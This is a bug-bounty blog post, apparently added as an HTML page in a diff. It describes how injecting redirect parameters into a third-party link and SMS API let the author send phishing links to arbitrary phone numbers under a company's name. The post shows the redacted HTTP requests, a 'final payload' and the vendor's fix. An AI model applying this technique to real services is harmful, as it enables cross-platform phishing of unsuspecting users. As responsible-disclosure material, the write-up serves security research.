@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<html>
+<link href="https://fonts.googleapis.com/css?family=Ubuntu" rel="stylesheet"> 
+<link rel="stylesheet" href="../index.css">
+
+<div class="header">
+  <a href="../index.html" class="logo">B3nac</a>
+  <div class="header-right">
+    <a href="../index.html">Home</a>
+    <a class="active" href="../blog.html">Blog</a>
+    <a href="../about.html">About</a>
+    <a href="../contact.html">Contact</a>
+  </div>
+</div>
+
+<div class ="paragraph-center">
+<h3>Spear texting via parameter injection</h3><p>This write-up focuses on how to take advantage of api knowledge and spotting opportunity when the right Burp request presents itself. By default this api lets you generate links with a public key, this finding was combined with an insecure account policy that allowed me to text any cell phone number with a custom link I created en route under the companies name. The crafted link could be used to redirect the users anywhere on the wild internet. There's three main take-aways from this write-up. Proxy all requests and follow the redirects. Read third party api documentation for exploitable implimentations. Support your proof of concept with official documentation to boost report quality. Now lets go over the methodology and techniques.</p><p>Note: This write-up is heavily redacted in order to follow the non-disclosure policy.</p><h3>Initial POST request with parameters</h3><p>The main website requests that loaded in Firefox development tools que'd me in on a GET request going to an external api. After inputing a cell phone number and clicking the link for the Android/IOS application download a POST request was sent to the third party api with the company api key and json data.</p><div class="p"><p class="active">
+POST /v1/url    HTTP/1.1
+Host: redacted
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0
+Accept: 
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://redacted
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 644
+Origin: https://redacted
+Connection: close
+
+scope=sms&amp;data={"title":"redacted","description":"redacted","image":"redacted","video":null,"type":"website","desktop":"http://www.example.com","android":"http://www.example.com","ios":"http://www.example.com","fallback":"http://www.example.com"}&amp;identity=redacted&amp;source=web-sdk&amp;browser=redacted&amp;sdk=redacted&amp;session_id=629935681409903301&amp;key=redacted</p><p>Key details from this request:</p><li>Used a json data param to send information that was used to generate a link in the data field.</li>
+<li>This data was redirected to another internal api endpoint with a number parameter.</li><div class="p"><p class="active">
+POST redacted HTTP/1.1
+Host: redacted
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0
+Accept: <em>/</em>
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://redacted
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 83
+Origin: https://redacted
+Connection: close
+
+sdk=redacted&amp;phone=redacted&amp;redacted_key=redacted</p><p>Conclusively if I could change the data that generated the link, the redirected request would send my crafted link under the companies account.</p><h3>Importance of reading documentation</h3><p>Software documentation is not only good for building software quickly, It's also great for figuring out ways to break software or expose weak points. This third party api's documentation allowed me to find out how I could set a redirect based on the platform used. In this case the platform was Android. As a test case I set example.com as the url for each platform to override all redirect settings. </p><div class="p"><p class="active">"desktop":"http://www.example.com","android:"http://www.example.com","ios":"http://www.example.com","fallback":"http://www.example.com"</p><h3>Proof of concept</h3><p>This step involved proxying two requests. The first request was a POST request that sent data to the account which created the link, and the second was the endpoint that sent the link to the cell phone number. </p><p>The initial POST request had only an android parameter:</p><div class="p"><p class="active">
+scope=sms&amp;data={"title":"Redacted,"description":"Redacted","image":"https://redacted","video":null,"type":"website","android":"http://www.example.com"}&amp;identity=redacted&amp;source=web-sdk&amp;browser=redacted&amp;sdk=web2.49.0&amp;session_id=redacted&amp;key=redacted</p><p>After reading the api documentation I learned their was a redirect property for every type of platform. Setting the same redirect for every platform (Desktop, Android, IOS) guaranteed a user clicking the link would go to the url I set on all platforms. Researching the api elevated the impact since this turned into a cross-platform spear text phishing attack.</p><h4>Final payload</h4><div class="p"><p class="active">scope=sms&amp;data={"title":"redacted","description":"redacted","image":"redacted","video":null,"type":"website","desktop":"http://www.example.com","android":"http://www.example.com","ios":"http://www.example.com","fallback":"http://www.example.com"}&identity=redacted&source=web-sdk&browser=redacted&sdk=redacted&session_id=629935681409903301&key=redacted</p><h4>Modified requests</h4><div class="p"><p class="active">
+POST /v1/url HTTP/1.1
+Host: redacted
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0
+Accept: 
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://redacted
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 644
+Origin: https://redacted
+Connection: close
+
+scope=sms&amp;data={"title":"redacted","description":"redacted","image":"redacted","video":null,"type":"website","desktop":"http://www.example.com","android":"http://www.example.com","ios":"http://www.example.com","fallback":"http://www.example.com"}&amp;identity=redacted&amp;source=web-sdk&amp;browser=redacted&amp;sdk=redacted&amp;session_id=629935681409903301&amp;key=redacted
+<img src="/images/spear-text-post-request.png"></a></p><center><h4>Redirects to text message endpoint</h4></center><div class="p"><p class="active">
+POST redacted HTTP/1.1
+Host: redacted
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0
+Accept: 
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: redacted
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 83
+Origin: redacted
+Connection: close
+sdk=redacted&phone=yournumberhere&key=redacted<img src="/images/speartextpostrequest2.png"></a><center><h4>Text message received</h4></center><p><img src="/images/linkreceived.jpg" width="40%"></a></p><center><h4>After pressing the link</h4></center><p><img src="/images/after-clicking-link.jpg" width="30%"></a></p><h3>The fix</h3><p>The redirect scope could be restricted within the companies account. The following response on each platform endpoint guaranteed the scope for the companies api key was restricted successfully.</p><div class="p"><p class="active">
+HTTP/1.1 400 Bad Request
+Content-Type: application/json
+Content-Length: 112
+Connection: close
+Access-Control-Allow-Origin: *
+Date: redacted
+Server: redacted/1.13.6.2
+X-Cache: Error from cloudfront
+
+{"error":{"code":400,"message":"Invalid value for property of 'desktop', url doesn't pass security tests"}}
+</p><p>I recieved a $900 bounty for this finding. Initially I found a vulnerability that the company didn't think was worth fixing, so I increased the impact and severity by making the attack vector cross-platform. Never give up and when possible increase the impact.</p>
+</div>
+<a href="https://www.buymeacoffee.com/9MAkIor2q" target="_blank"><img src="https://bmc-cdn.nyc3.digitaloceanspaces.com/BMC-button-images/custom_images/orange_img.png" alt="Buy Me A Coffee" style="height: auto !important;width: auto !important;" ></a>
+</html>
